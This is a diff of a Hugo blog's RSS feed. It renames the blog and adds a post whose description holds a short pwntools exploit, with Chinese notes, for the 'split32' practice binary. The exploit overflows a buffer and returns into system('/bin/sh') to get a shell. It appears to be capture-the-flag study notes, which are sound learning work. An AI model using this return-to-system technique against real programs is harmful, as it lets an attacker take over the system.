@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on Blog</title>
+    <title>Posts on 江南酒与燕赵歌</title>
     <link>https://zhu1ang.github.io/post/</link>
-    <description>Recent content in Posts on Blog</description>
+    <description>Recent content in Posts on 江南酒与燕赵歌</description>
     <generator>Hugo</generator>
     <language>zh</language>
     <lastBuildDate>Mon, 08 Jul 2024 19:06:24 +0800</lastBuildDate>
@@ -21,6 +21,13 @@
       <pubDate>Mon, 08 Jul 2024 17:53:07 +0800</pubDate>
       <guid>https://zhu1ang.github.io/post/blog/</guid>
       <description>this is a test</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://zhu1ang.github.io/post/xxx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://zhu1ang.github.io/post/xxx/</guid>
+      <description>无题 偏移44 具体不写&#xA;exp&#xA;from pwn import * sh = process(&amp;#39;./split32&amp;#39;) system_addr = 0x80483e0 bin_sh_addr = 0x804a030 payload = b&amp;#39;a&amp;#39;*44 + p32(system_addr) + p32(0) + p32(bin_sh_addr) sh.sendline(payload) sh.interactive() 返回地址覆盖为system@plt，也是可以的，只不过因为_dl_runtime_resolve最后有个ret 0xc，在字符串地址之前要再加个4字节填充</description>
     </item>
   </channel>
 </rss>
